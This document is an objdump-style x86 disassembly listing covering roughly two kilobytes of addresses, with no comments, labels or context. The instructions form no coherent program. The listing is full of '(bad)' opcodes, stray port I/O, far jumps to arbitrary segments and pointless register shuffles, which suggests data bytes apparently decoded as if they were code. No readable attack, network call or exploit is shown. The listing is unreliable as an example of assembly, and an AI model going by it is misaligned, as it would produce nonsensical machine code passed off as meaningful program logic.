  4125d5:	sbb    BYTE PTR [edx-0x13a5f7bb],ch
  4125db:	pop    eax
  4125dc:	push   esi
  4125dd:	std    
  4125de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125df:	push   eax
  4125e0:	and    al,BYTE PTR [ecx+0x17622713]
  4125e6:	lock add DWORD PTR [edi-0x60cef822],ecx
  4125ed:	jp     0x4125f7
  4125ef:	inc    esp
  4125f0:	rcr    esp,1
  4125f2:	and    esp,ebp
  4125f4:	xor    esi,DWORD PTR [ebx-0x15]
  4125f7:	xchg   esp,eax
  4125f8:	call   0x78fb8e95
  4125fd:	int3   
  4125fe:	ds push ebx
  412600:	inc    ecx
  412601:	loop   0x41258f
  412603:	push   ebx
  412604:	add    ax,0xd684
  412608:	add    eax,0x61c07b01
  41260d:	int3   
  41260e:	dec    esi
  41260f:	add    cl,BYTE PTR [esi+0x1b]
  412612:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  412614:	fldl2e 
  412616:	out    0x60,al
  412618:	or     ch,dh
  41261a:	ins    DWORD PTR es:[edi],dx
  41261b:	xchg   edi,eax
  41261c:	cs dec edx
  41261e:	out    dx,al
  41261f:	imul   ecx,DWORD PTR [edx+0x5],0xffffff83
  412623:	xchg   ebp,eax
  412624:	pop    eax
  412625:	idiv   esi
  412627:	jb     0x412681
  412629:	aas    
  41262a:	in     al,dx
  41262b:	pop    es
  41262c:	inc    edx
  41262d:	rep ins BYTE PTR es:[edi],dx
  41262f:	bound  ebx,QWORD PTR ss:[ebx]
  412632:	cmp    ah,BYTE PTR [edi+0x568ccf10]
  412638:	rol    esp,0x7f
  41263b:	ins    DWORD PTR es:[edi],dx
  41263c:	addr16 xor eax,0xdda36d4c
  412642:	dec    BYTE PTR [edx]
  412644:	jne    0x412610
  412646:	pusha  
  412647:	inc    ebx
  412648:	mov    esi,0x742b080f
  41264d:	xchg   edx,eax
  41264e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41264f:	into   
  412650:	jo     0x4126c3
  412652:	pushf  
  412653:	jle    0x4126c3
  412655:	ins    BYTE PTR es:[edi],dx
  412656:	inc    edx
  412657:	mov    ds:0xfa0ae5e2,eax
  41265c:	dec    esi
  41265d:	neg    DWORD PTR [edx+0x6744314]
  412663:	scas   al,BYTE PTR es:[edi]
  412664:	push   eax
  412665:	js     0x412679
  412667:	scas   al,BYTE PTR es:[edi]
  412668:	daa    
  412669:	leave  
  41266a:	inc    ebx
  41266b:	dec    eax
  41266c:	sbb    eax,esi
  41266e:	popa   
  41266f:	cs aas 
  412671:	addr16 mov bh,0xf5
  412674:	fwait
  412675:	mov    bh,0xd5
  412677:	test   DWORD PTR [ebp+0x93efd7a],eax
  41267d:	lea    esp,[ebx]
  41267f:	in     al,0x31
  412681:	fidivr WORD PTR [eax+0x399c82b8]
  412687:	jns    0x412642
  412689:	push   ds
  41268a:	jecxz  0x41261f
  41268c:	pop    ebp
  41268d:	xchg   edi,eax
  41268e:	nop
  41268f:	jns    0x41267e
  412691:	out    dx,eax
  412692:	fucomi st,st(6)
  412694:	jno    0x4126f6
  412696:	push   ebp
  412697:	xor    al,0x21
  412699:	and    al,0x67
  41269b:	push   esp
  41269c:	stos   BYTE PTR es:[edi],al
  41269d:	aam    0x94
  41269f:	push   edx
  4126a0:	sbb    BYTE PTR [edx],al
  4126a2:	cmp    ecx,DWORD PTR [ebx]
  4126a4:	cmp    dl,cl
  4126a6:	adc    edx,esi
  4126a8:	sub    DWORD PTR [ecx-0x673ba06a],ecx
  4126ae:	daa    
  4126af:	retf   
  4126b0:	cmp    DWORD PTR [edx-0x19],edi
  4126b3:	mul    BYTE PTR [ecx]
  4126b5:	je     0x412643
  4126b7:	sahf   
  4126b8:	xchg   DWORD PTR [ecx-0x2a10d621],ebx
  4126be:	stos   DWORD PTR es:[edi],eax
  4126bf:	jge    0x4126c5
  4126c1:	inc    ebx
  4126c2:	leave  
  4126c3:	fcmovb st,st(2)
  4126c5:	add    ebp,DWORD PTR [eax]
  4126c7:	push   eax
  4126c8:	jp     0x4126f7
  4126ca:	adc    BYTE PTR [eax+edx*4-0x1a59a7a8],cl
  4126d1:	mov    ebx,DWORD PTR [ebx+0x6]
  4126d4:	fsubr  DWORD PTR [eax]
  4126d6:	call   FWORD PTR [ebx+0xd]
  4126d9:	aad    0x58
  4126db:	(bad)  
  4126dc:	cmp    edi,edi
  4126de:	xchg   esi,eax
  4126df:	popa   
  4126e0:	dec    esi
  4126e1:	cmp    al,0x4d
  4126e3:	cmc    
  4126e4:	aaa    
  4126e5:	ret    
  4126e6:	push   es
  4126e7:	fiadd  WORD PTR [ebx-0x3c]
  4126ea:	dec    DWORD PTR [ebp-0x6e002548]
  4126f0:	cmp    al,0xa2
  4126f2:	sub    eax,0x46532a02
  4126f7:	pop    ecx
  4126f8:	or     al,0x51
  4126fa:	and    DWORD PTR [esi-0x5973e6d5],esi
  412700:	shl    BYTE PTR [edi-0x27e17463],1
  412706:	inc    ebx
  412707:	add    eax,0x9d393d04
  41270c:	imul   esi,DWORD PTR [ecx+eax*1],0x34
  412710:	(bad)  
  412711:	out    dx,eax
  412712:	ds inc esp
  412714:	ret    0x5eb4
  412717:	arpl   WORD PTR [esi-0x1f874a56],dx
  41271d:	out    dx,al
  41271e:	mov    bl,0x1f
  412720:	mov    ebx,0x704c4cfa
  412725:	cmp    eax,ecx
  412727:	(bad)  
  412728:	(bad)  
  412729:	mov    eax,0x1335223a
  41272e:	repz inc esi
  412730:	sar    BYTE PTR [eax-0x4a0e8ba0],1
  412736:	retf   0x2e1c
  412739:	pusha  
  41273a:	stc    
  41273b:	jl     0x41276e
  41273d:	sbb    al,0xd0
  41273f:	stos   BYTE PTR es:[edi],al
  412740:	mov    ebx,0x1afa1ff2
  412745:	mov    edx,0x566b44bd
  41274a:	lea    ebx,[edx-0x3c9d7bdd]
  412750:	test   bh,ah
  412752:	jle    0x4127d3
  412754:	mov    esp,0x6d355817
  412759:	es push edx
  41275b:	test   eax,0x29d2f4dc
  412760:	mov    al,0xd6
  412762:	das    
  412763:	ins    DWORD PTR es:[edi],dx
  412764:	xor    bl,cl
  412766:	inc    ebp
  412767:	sub    eax,DWORD PTR [edi]
  412769:	(bad)  
  41276a:	jecxz  0x41271e
  41276c:	mov    ch,0x77
  41276e:	stos   BYTE PTR es:[edi],al
  41276f:	lock jp 0x412748
  412772:	lock xchg esi,eax
  412774:	add    dh,ah
  412776:	sbb    BYTE PTR [ecx],cl
  412778:	jmp    0x150b:0x1b1ac265
  41277f:	mov    al,ds:0x718e0def
  412784:	push   es
  412785:	aam    0xf3
  412787:	test   al,0xd8
  412789:	mov    ebx,0x956eafeb
  41278e:	inc    edi
  41278f:	push   eax
  412790:	pop    ss
  412791:	aas    
  412792:	push   eax
  412793:	(bad)
  412797:	jg     0x412768
  412799:	aad    0x37
  41279b:	call   0xc5e2:0x523821ad
  4127a2:	fxch   st(6)
  4127a4:	stos   BYTE PTR es:[edi],al
  4127a5:	jl     0x4127f3
  4127a7:	push   ebx
  4127a8:	hlt    
  4127a9:	lahf   
  4127aa:	lods   eax,DWORD PTR ds:[esi]
  4127ab:	leave  
  4127ac:	push   ebp
  4127ad:	inc    esp
  4127ae:	jl     0x41280d
  4127b0:	test   eax,0x8564a510
  4127b5:	cmp    edx,ebp
  4127b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127b8:	aaa    
  4127b9:	jo     0x4127e1
  4127bb:	jecxz  0x4127a7
  4127bd:	mov    bl,0x60
  4127bf:	mov    esp,0xd50d3c31
  4127c4:	pusha  
  4127c5:	ins    DWORD PTR es:[edi],dx
  4127c6:	jle    0x4127f8
  4127c8:	stos   BYTE PTR es:[edi],al
  4127c9:	sbb    dl,BYTE PTR ds:0xff16a10e
  4127cf:	pop    ecx
  4127d0:	lds    esp,FWORD PTR [esi-0x2d45890f]
  4127d6:	jno    0x412836
  4127d8:	inc    esi
  4127d9:	in     eax,0x5f
  4127db:	jmp    0x8b33966e
  4127e0:	or     BYTE PTR [eax+edx*4],cl
  4127e3:	jmp    0x9313e62a
  4127e8:	test   bl,cl
  4127ea:	lea    esp,[ebx+ebx*1]
  4127ed:	xor    BYTE PTR [ebx],dl
  4127ef:	mov    ah,0x11
  4127f1:	add    al,0xe7
  4127f3:	mov    DWORD PTR [edi-0x4d243985],ebp
  4127f9:	inc    edx
  4127fa:	dec    ecx
  4127fb:	jecxz  0x4127ce
  4127fd:	out    0xcc,al
  4127ff:	jg     0x41279d
  412801:	push   edi
  412802:	or     esp,esi
  412804:	pop    ds
  412805:	mov    DWORD PTR [edx+0x1],ecx
  412808:	sbb    DWORD PTR [ecx+0x6a],ecx
  41280b:	test   BYTE PTR [edx+0x3c48308f],al
  412811:	inc    esi
  412812:	(bad)  
  412813:	and    ebp,DWORD PTR [ebx+0x7b]
  412816:	cmp    eax,0xdde139b0
  41281b:	retf   
  41281c:	push   ss
  41281d:	movzx  ebx,WORD PTR [esi-0x63]
  412821:	and    esi,DWORD PTR [ebx+0x52]
  412824:	cmc    
  412825:	push   ecx
  412826:	stos   BYTE PTR es:[edi],al
  412827:	sahf   
  412828:	mov    ebx,0x51189fbe
  41282d:	rcl    ah,0xde
  412830:	(bad)  
  412831:	and    dh,BYTE PTR [eax+0x48]
  412834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412835:	jmp    0xa15dd563
  41283a:	push   ss
  41283b:	in     eax,dx
  41283c:	sub    dh,BYTE PTR [ecx-0x116c5e87]
  412842:	xor    BYTE PTR [esi],0xfc
  412845:	xchg   ebx,eax
  412846:	jmp    0x41288c
  412848:	lock jmp 0x1038:0xd144150b
  412850:	(bad)  
  412851:	(bad)  
  412852:	and    BYTE PTR ds:0x182bf20a,dl
  412858:	or     eax,0x2a5b01b4
  41285d:	test   eax,0x449d239e
  412862:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412863:	and    dl,BYTE PTR [edx]
  412865:	jne    0x412819
  412867:	jo     0x4127ee
  412869:	in     al,dx
  41286a:	fiadd  WORD PTR [edi-0x25]
  41286d:	pushf  
  41286e:	jnp    0x412838
  412870:	scas   al,BYTE PTR es:[edi]
  412871:	add    eax,0xa4034695
  412876:	xchg   edx,eax
  412877:	scas   eax,DWORD PTR es:[edi]
  412878:	sbb    al,0xfa
  41287a:	adc    al,0x52
  41287c:	pop    ebp
  41287d:	out    0x64,al
  41287f:	inc    esp
  412880:	inc    edx
  412881:	outs   dx,DWORD PTR ds:[esi]
  412882:	shr    ch,1
  412884:	std    
  412885:	dec    ebx
  412886:	xchg   ebx,eax
  412887:	arpl   WORD PTR [ecx-0x73],bx
  41288a:	(bad)  
  41288c:	shl    DWORD PTR [eax],cl
  41288e:	outs   dx,DWORD PTR ds:[esi]
  41288f:	outs   dx,BYTE PTR ds:[esi]
  412890:	mov    ch,0x46
  412892:	mov    edx,0x910c2ae3
  412897:	and    eax,DWORD PTR [edi-0xfa10d75]
  41289d:	or     eax,0x295140b2
  4128a2:	icebp  
  4128a3:	adc    DWORD PTR [edi+0x73],0x7e
  4128a7:	imul   BYTE PTR [ecx+0x582d574d]
  4128ad:	outs   dx,DWORD PTR ds:[esi]
  4128ae:	aaa    
  4128af:	stos   DWORD PTR es:[edi],eax
  4128b0:	test   eax,0xc5f63417
  4128b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128b6:	repz in eax,dx
  4128b8:	arpl   sp,sp
  4128ba:	out    dx,eax
  4128bb:	repnz sbb ah,BYTE PTR [ebx]
  4128be:	dec    esp
  4128bf:	mov    edi,0x7b193eeb
  4128c4:	scas   al,BYTE PTR es:[edi]
  4128c5:	pop    eax
  4128c6:	sub    eax,0x3a4881e9
  4128cb:	ja     0x41285a
  4128cd:	dec    edx
  4128ce:	sbb    al,0x58
  4128d0:	shl    DWORD PTR ds:0xd80f219f,cl
  4128d6:	pop    ds
  4128d7:	sub    DWORD PTR [eax+eiz*1],0x53
  4128db:	icebp  
  4128dc:	inc    esi
  4128dd:	and    ebx,DWORD PTR [eax-0x3b1b0297]
  4128e3:	je     0x412900
  4128e5:	push   esi
  4128e6:	mov    eax,0xa8593351
  4128eb:	mov    bl,0x37
  4128ed:	sbb    al,0x38
  4128ef:	mov    ebp,0x1b43529c
  4128f4:	xchg   ebx,eax
  4128f5:	data16 fidivr WORD PTR [edx-0x69be953a]
  4128fc:	stc    
  4128fd:	(bad)  
  4128fe:	mov    edi,0x54cf4ac4
  412903:	mov    bh,BYTE PTR [edx]
  412905:	ret    0x4650
  412908:	or     ch,BYTE PTR [edx+ebx*4+0x36]
  41290c:	pop    ebp
  41290d:	adc    al,0x54
  41290f:	xlat   BYTE PTR ds:[ebx]
  412910:	fnstsw WORD PTR [ebp+0x18]
  412913:	mov    WORD PTR [edi+0x41],fs
  412916:	mov    ebp,ebx
  412918:	inc    edx
  412919:	fidivr DWORD PTR [esi-0x65e07c15]
  41291f:	inc    edx
  412920:	daa    
  412921:	or     eax,0xfc5f1de6
  412926:	mov    ah,0xef
  412928:	mov    gs,WORD PTR [eax-0x40]
  41292b:	mov    dl,0x36
  41292d:	pop    ebp
  41292e:	lahf   
  41292f:	rcr    DWORD PTR [edx-0x40],1
  412932:	push   edi
  412933:	push   ebx
  412934:	aas    
  412935:	repz mov eax,0x6115d0dc
  41293b:	test   DWORD PTR [ecx-0x3c616032],ebx
  412941:	into   
  412942:	cmp    eax,DWORD PTR [ecx]
  412944:	cld    
  412945:	test   eax,0x54f03314
  41294a:	and    BYTE PTR [edx],bh
  41294c:	stos   BYTE PTR es:[edi],al
  41294d:	out    0x75,al
  41294f:	mov    esi,0x79811e2c
  412954:	and    al,0x35
  412956:	xchg   esi,eax
  412957:	test   DWORD PTR [esi-0xb40e548],0xa70115f5
  412961:	mov    esi,0xfe0d1b55
  412966:	pushf  
  412967:	push   ecx
  412968:	shl    DWORD PTR [ecx-0x7a17c8eb],0x48
  41296f:	push   edi
  412970:	sub    dl,dh
  412972:	cmp    bl,BYTE PTR [esi+0x214a558f]
  412978:	push   ds
  412979:	in     eax,dx
  41297a:	fiadd  WORD PTR [edx-0x79]
  41297d:	mov    ecx,0xd33be1ac
  412982:	aad    0x10
  412984:	cmp    ebx,DWORD PTR ds:0x8fad8625
  41298a:	lahf   
  41298b:	pop    ds
  41298c:	xchg   edi,eax
  41298d:	xchg   edx,eax
  41298e:	mov    eax,DWORD PTR [esi]
  412990:	fstp   TBYTE PTR [ecx+0x3632f673]
  412996:	mov    ah,0xbd
  412998:	enter  0x3181,0x7e
  41299c:	and    al,0xd1
  41299e:	jno    0x41299f
  4129a0:	fcomp  QWORD PTR [ebp+ebp*1-0x20]
  4129a4:	jmp    0x12a3:0xd9fe3905
  4129ab:	pop    eax
  4129ac:	mov    dl,0x52
  4129ae:	inc    esi
  4129af:	ins    DWORD PTR es:[edi],dx
  4129b0:	lods   al,BYTE PTR ds:[esi]
  4129b1:	mov    ecx,0xae07ae80
  4129b6:	jg     0x4129de
  4129b8:	cmp    dh,ah
  4129ba:	(bad)  
  4129bc:	loopne 0x41294f
  4129be:	cmp    dl,BYTE PTR [edx+0x6]
  4129c1:	mov    ebp,0xbb0f06fd
  4129c6:	repz pop ebp
  4129c8:	into   
  4129c9:	loope  0x4129a9
  4129cb:	les    esi,FWORD PTR [ebp+0x5e]
  4129ce:	sti    
  4129cf:	sub    al,0xab
  4129d1:	retf   0x7ceb
  4129d4:	mov    edx,eax
  4129d6:	or     bl,dh
  4129d8:	mov    ch,0xce
  4129da:	inc    ebx
  4129db:	jb     0x4129bc
  4129dd:	das    
  4129de:	mov    ch,0x2f
  4129e0:	(bad)  
  4129e1:	mov    ch,0xfb
  4129e3:	fsub   st,st(0)
  4129e5:	sub    eax,0x4584e20e
  4129ea:	pop    ds
  4129eb:	lods   eax,DWORD PTR ds:[esi]
  4129ec:	inc    ecx
  4129ed:	retf   
  4129ee:	dec    ebx
  4129ef:	sbb    al,0x7e
  4129f1:	sbb    BYTE PTR ds:[edx+0x567022ee],al
  4129f8:	xchg   ebx,eax
  4129f9:	or     esp,DWORD PTR [esi]
  4129fb:	fs push ss
  4129fd:	inc    esp
  4129fe:	mov    ebx,0xbc030cbb
  412a03:	ffree  st(5)
  412a05:	push   0x3e4eccd6
  412a0a:	ja     0x412a28
  412a0c:	pop    edi
  412a0d:	or     eax,0xb2d8b355
  412a12:	stc    
  412a13:	cdq    
  412a14:	xchg   edi,eax
  412a15:	clc    
  412a16:	(bad)  
  412a17:	lahf   
  412a18:	fsubr  QWORD PTR [edx-0x32e808ab]
  412a1e:	inc    ecx
  412a1f:	into   
  412a20:	jnp    0x4129c4
  412a22:	jbe    0x4129d4
  412a24:	repz push edx
  412a26:	pop    esp
  412a27:	cmc    
  412a28:	cld    
  412a29:	push   ds
  412a2a:	add    BYTE PTR ds:0xc36025a5,cl
  412a30:	xlat   BYTE PTR ds:[ebx]
  412a31:	jg     0x4129d0
  412a33:	mov    ch,0x2d
  412a35:	sti    
  412a36:	fld    QWORD PTR [ebp+0x3c]
  412a39:	and    ecx,edi
  412a3b:	jnp    0x412a52
  412a3d:	mov    ch,al
  412a3f:	mov    dh,0x3a
  412a41:	nop
  412a42:	mov    cs,edi
  412a44:	mov    dl,0x2a
  412a46:	add    DWORD PTR [eax-0x1d],ebp
  412a49:	iret   
  412a4a:	inc    eax
  412a4b:	je     0x412a6c
  412a4d:	inc    esi
  412a4e:	pop    ds
  412a4f:	pushf  
  412a50:	pop    ecx
  412a51:	jns    0x412aa9
  412a53:	xchg   ebx,eax
  412a54:	lds    esi,FWORD PTR [edi+0x67]
  412a57:	adc    ebp,ebp
  412a59:	dec    eax
  412a5a:	ror    DWORD PTR [ebp+0x3],cl
  412a5d:	shr    BYTE PTR [ebp+0x68],0x84
  412a61:	mov    BYTE PTR [ecx],al
  412a63:	stc    
  412a64:	xchg   ecx,eax
  412a65:	retf   0x944e
  412a68:	inc    esp
  412a69:	shr    DWORD PTR [edi-0x1db3bc60],0xb6
  412a70:	xor    DWORD PTR [edx],eax
  412a72:	push   ecx
  412a73:	jg     0x412ae3
  412a75:	inc    esp
  412a76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a77:	pop    edx
  412a78:	dec    edi
  412a79:	test   ecx,edx
  412a7b:	inc    ebp
  412a7c:	mul    DWORD PTR [eax-0x17]
  412a7f:	xor    ah,BYTE PTR [edx]
  412a81:	(bad)  
  412a82:	rcl    BYTE PTR [edi],cl
  412a84:	lods   al,BYTE PTR ds:[esi]
  412a85:	ss ret 
  412a87:	mov    cl,0x5e
  412a89:	icebp  
  412a8a:	inc    ecx
  412a8b:	fdiv   st(2),st
  412a8d:	shl    DWORD PTR [edi+0x28],0xea
  412a91:	and    al,BYTE PTR [eax-0x43]
  412a94:	xchg   BYTE PTR [edx],ch
  412a96:	sti    
  412a97:	and    ecx,DWORD PTR [edx]
  412a99:	idiv   DWORD PTR [edx]
  412a9b:	shr    BYTE PTR [esi+0x1e],0x72
  412a9f:	lods   eax,DWORD PTR ds:[esi]
  412aa0:	inc    ebp
  412aa1:	sbb    ch,BYTE PTR [esp+edx*8-0x37]
  412aa5:	push   esi
  412aa6:	js     0x412b25
  412aa8:	dec    edi
  412aa9:	test   al,0x5a
  412aab:	jg     0x412ac6
  412aad:	ja     0x412a64
  412aaf:	inc    eax
  412ab0:	lea    ebp,[esi+0x62f698ab]
  412ab6:	sbb    al,0x83
  412ab8:	int3   
  412ab9:	mov    ?,WORD PTR [ecx+0x2c8714a5]
  412abf:	jae    0x412b33
  412ac1:	mov    ch,0xa
  412ac3:	push   cs
  412ac4:	into   
  412ac5:	fcomp  QWORD PTR [esi-0x7ecc0fc5]
  412acb:	mov    esi,0x22b7d88f
  412ad0:	xor    eax,0xb7ca09dc
  412ad5:	push   ecx
  412ad6:	in     al,0xef
  412ad8:	bound  ebp,QWORD PTR [eax+0x3ee60611]
  412ade:	or     ebx,DWORD PTR [edi+eax*1+0x7a]
  412ae2:	push   ebp
  412ae3:	or     al,0xe4
  412ae5:	jg     0x412b52
  412ae7:	pop    ebp
  412ae8:	mov    ecx,0xe7bdad9c
  412aed:	std    
  412aee:	loope  0x412b3c
  412af0:	in     al,dx
  412af1:	das    
  412af2:	dec    ebp
  412af3:	xor    BYTE PTR [esi+ebx*2+0x3e],cl
  412af7:	xor    al,0x6c
  412af9:	(bad)  
  412afa:	mov    ds:0x7fb39a95,eax
  412aff:	mov    WORD PTR [esi+0x40ee83a5],ss
  412b05:	push   ebp
  412b06:	pop    ebx
  412b07:	pop    ss
  412b08:	call   0x3d8e:0x448d5d71
  412b0f:	xlat   BYTE PTR ds:[ebx]
  412b10:	js     0x412b14
  412b12:	xchg   ebx,eax
  412b13:	dec    edx
  412b14:	fsub   DWORD PTR [eax-0x7580f2ed]
  412b1a:	pushw  0x4af0
  412b1e:	addr16 icebp 
  412b20:	inc    edi
  412b21:	xchg   edi,eax
  412b22:	aad    0x73
  412b24:	scas   eax,DWORD PTR es:[edi]
  412b25:	loop   0x412ad7
  412b27:	mov    DWORD PTR [esi+0x4322aa09],ebp
  412b2d:	inc    esp
  412b2e:	fidiv  DWORD PTR [ecx-0x48]
  412b31:	call   0xf125272c
  412b36:	and    BYTE PTR [edx],bl
  412b38:	je     0x412b79
  412b3a:	push   esp
  412b3b:	mov    esi,0x691404fd
  412b40:	out    0x97,eax
  412b42:	test   eax,0xeca494a3
  412b47:	fxtract 
  412b49:	int3   
  412b4a:	scas   eax,DWORD PTR es:[edi]
  412b4b:	adc    esi,edi
  412b4d:	xchg   ebp,eax
  412b4e:	in     eax,dx
  412b4f:	out    0x45,al
  412b51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b52:	(bad)  
  412b53:	push   cs
  412b54:	icebp  
  412b55:	adc    eax,0x4306b61
  412b5a:	pushf  
  412b5b:	in     al,0xd7
  412b5d:	jle    0x412bcf
  412b5f:	dec    edx
  412b60:	(bad)  
  412b61:	jge    0x412aec
  412b63:	repnz sahf 
  412b65:	cli    
  412b66:	ret    0x8f94
  412b69:	mov    edx,0x7c471678
  412b6e:	or     ecx,DWORD PTR [edx]
  412b70:	fs retf 
  412b72:	xchg   edx,eax
  412b73:	add    cl,bl
  412b75:	sbb    DWORD PTR [edx-0x35],edi
  412b78:	je     0x412bf4
  412b7a:	ins    DWORD PTR es:[edi],dx
  412b7b:	xchg   esp,eax
  412b7c:	dec    ecx
  412b7d:	clc    
  412b7e:	lods   al,BYTE PTR ds:[esi]
  412b7f:	ds mov ch,0xf1
  412b82:	inc    ebx
  412b83:	jge    0x412b5a
  412b85:	or     BYTE PTR [esi-0x64581da9],ah
  412b8b:	inc    esi
  412b8c:	stos   DWORD PTR es:[edi],eax
  412b8d:	mov    edx,0x35f5007c
  412b92:	or     ecx,DWORD PTR [eax]
  412b94:	pusha  
  412b95:	adc    edi,ecx
  412b97:	les    ebx,FWORD PTR [edx+0x7a1beef9]
  412b9d:	rcr    DWORD PTR ds:0x3c6f25e1,1
  412ba3:	sahf   
  412ba4:	mov    al,0x1
  412ba6:	mov    WORD PTR [edx],ds
  412ba8:	mov    ecx,0x6fde3d3f
  412bad:	xchg   edi,eax
  412bae:	out    dx,eax
  412baf:	repz xchg ebp,eax
  412bb1:	add    edi,esi
  412bb3:	imul   edi,DWORD PTR [edi+0x2b],0x799dbcd8
  412bba:	dec    ebx
  412bbb:	pop    eax
  412bbc:	loope  0x412be3
  412bbe:	cmp    al,0x17
  412bc0:	in     eax,dx
  412bc1:	imul   eax,DWORD PTR [esi],0x2c4a0632
  412bc7:	jb     0x412c37
  412bc9:	es jbe 0x412bdc
  412bcc:	dec    ecx
  412bcd:	mov    eax,ds:0x976c7a90
  412bd2:	jb     0x412b63
  412bd4:	not    esi
  412bd6:	js     0x412c57
  412bd8:	dec    ebx
  412bd9:	push   cs
  412bda:	adc    DWORD PTR [esi],ebx
  412bdc:	ins    DWORD PTR es:[edi],dx
  412bdd:	pop    ss
  412bde:	adc    BYTE PTR [eax-0x6c],cl
  412be1:	rol    BYTE PTR [edx-0x5],1
  412be4:	add    al,0x38
  412be6:	sbb    BYTE PTR [ecx],0x3b
  412be9:	push   cs
  412bea:	test   eax,0x55262255
  412bef:	pusha  
  412bf0:	iret   
  412bf1:	jmp    0x412c57
  412bf3:	or     esp,DWORD PTR [edx-0x27]
  412bf6:	(bad)  
  412bf7:	ins    BYTE PTR es:[edi],dx
  412bf8:	sbb    BYTE PTR [eax+0x45476b17],0x93
  412bff:	sub    al,0x21
  412c01:	dec    edi
  412c02:	fadd   QWORD PTR [edx]
  412c04:	mov    BYTE PTR [ecx],0x4e
  412c07:	or     al,0xab
  412c09:	dec    dh
  412c0b:	repz test BYTE PTR [ebx-0x32],ah
  412c0f:	pop    ds
  412c10:	or     DWORD PTR [ecx],ebp
  412c12:	cmp    eax,0x802779f7
  412c17:	jmp    0x412c33
  412c19:	pop    eax
  412c1a:	test   BYTE PTR [edi],0x67
  412c1d:	test   eax,0x896e985f
  412c22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c23:	int    0xa1
  412c25:	mov    esp,ecx
  412c27:	sub    al,0xff
  412c29:	iret   
  412c2a:	xor    eax,0x2e001ec
  412c2f:	pusha  
  412c30:	stos   DWORD PTR es:[edi],eax
  412c31:	mov    es,esi
  412c33:	jl     0x412c62
  412c35:	icebp  
  412c36:	dec    esi
  412c37:	jg     0x412c0a
  412c39:	mov    edi,0xf7572ceb
  412c3e:	call   0xccde7b97
  412c43:	fadd   st(1),st
  412c45:	mov    ecx,0xe0a3b76f
  412c4a:	mov    eax,0x8c97c0bd
  412c4f:	repz fsub QWORD PTR [ebp-0x4c]
  412c53:	or     DWORD PTR [ebp+0x7],edi
  412c56:	xor    BYTE PTR [ebp+0x1c0140c7],al
  412c5c:	add    al,0xea
  412c5e:	ins    BYTE PTR es:[edi],dx
  412c5f:	pop    ebp
  412c60:	pop    esp
  412c61:	pop    edx
  412c62:	inc    eax
  412c63:	jae    0x412c7f
  412c65:	xlat   BYTE PTR ds:[ebx]
  412c66:	jno    0x412ce2
  412c68:	jns    0x412cd6
  412c6a:	and    eax,DWORD PTR [ebx]
  412c6c:	sub    ch,BYTE PTR [esi-0x64e7efd0]
  412c72:	(bad)  [ecx-0x19]
  412c75:	sub    al,0xc6
  412c77:	(bad)  
  412c78:	cwde   
  412c79:	pop    edx
  412c7a:	adc    dl,BYTE PTR ds:0xbec7
  412c7f:	jns    0x412c5b
  412c81:	add    DWORD PTR [esi-0x7951d79],0xffffffd8
  412c88:	aad    0x9b
  412c8a:	adc    edx,ebp
  412c8c:	xor    DWORD PTR [esi-0x3b],edx
  412c8f:	das    
  412c90:	jg     0x412c34
  412c92:	pop    ecx
  412c93:	int3   
  412c94:	aad    0x49
  412c96:	out    dx,al
  412c97:	or     dh,0xab
  412c9a:	dec    ebx
  412c9b:	jmp    0xbc14624d
  412ca0:	add    ch,BYTE PTR [eax+0x6a1d3f0e]
  412ca6:	sar    BYTE PTR es:[esi-0x11],1
  412caa:	sbb    eax,0xbf82632f
  412caf:	cld    
  412cb0:	sti    
  412cb1:	ins    BYTE PTR es:[edi],dx
  412cb2:	cmp    eax,0x221ceb6e
  412cb7:	ja     0x412ca6
  412cb9:	imul   edi,ebx,0x19b90e08
  412cbf:	mov    ch,0x1a
  412cc1:	test   eax,0xd7df620b
  412cc6:	sub    al,0xa7
  412cc8:	cmc    
  412cc9:	adc    BYTE PTR [esi],bh
  412ccb:	xchg   ecx,eax
  412ccc:	ror    BYTE PTR [ebx],0xcb
  412ccf:	inc    esp
  412cd0:	adc    al,0x24
  412cd2:	add    DWORD PTR [esi+0x65],0x7b830064
  412cd9:	xchg   edi,eax
  412cda:	mov    ebp,0xf1bf3012
  412cdf:	ins    DWORD PTR es:[edi],dx
  412ce0:	test   eax,0xe3c0fd5e
  412ce5:	mov    esi,0xb5e38293
  412cea:	dec    ebp
  412ceb:	mov    dh,0xdb
  412ced:	mov    al,0xac
  412cef:	mov    ds:0xab0cb4b0,al
  412cf4:	or     al,BYTE PTR [ebp+0x1cb228b0]
  412cfa:	addr16 pop ecx
  412cfc:	stos   BYTE PTR es:[edi],al
  412cfd:	jnp    0x412d16
  412cff:	sbb    al,0x73
  412d01:	sub    al,0x4f
  412d03:	push   cs
  412d04:	push   eax
  412d05:	mov    eax,ds:0x48a98449
  412d0a:	jmp    0x801a:0x33addc64
  412d11:	mov    BYTE PTR [ebx],bl
  412d13:	data16 or BYTE PTR [ebp+0x47f8fd82],0xe8
  412d1b:	fs call 0xc36bedf6
  412d21:	sar    BYTE PTR [ecx],cl
  412d23:	add    BYTE PTR [esi-0x38fe95fe],0xc5
  412d2a:	mov    BYTE PTR [edx-0x7b],ch
  412d2d:	je     0x412d58
  412d2f:	in     eax,0xff
  412d31:	add    eax,0x2ec101a4
  412d36:	mov    al,0x93
  412d38:	les    ebp,FWORD PTR [ebx+0x72]
  412d3b:	xchg   esp,eax
  412d3c:	xchg   ecx,eax
  412d3d:	dec    edi
  412d3e:	stc    
  412d3f:	neg    DWORD PTR [edx+0xd]
  412d42:	mov    esp,0x9012d92c
  412d47:	fisub  WORD PTR [edx]
  412d49:	lahf   
  412d4a:	or     al,BYTE PTR [ecx+0x0]
  412d4d:	fs ins BYTE PTR es:[di],dx
  412d50:	ins    DWORD PTR es:[edi],dx
  412d51:	jnp    0x412d21
  412d53:	call   FWORD PTR [esi+eax*8]
  412d56:	test   BYTE PTR [eax+ebp*4],cl
  412d59:	dec    eax
  412d5a:	dec    edx
  412d5b:	into   
  412d5c:	mov    edi,0xb0548a6e
  412d61:	add    eax,0xf0459beb
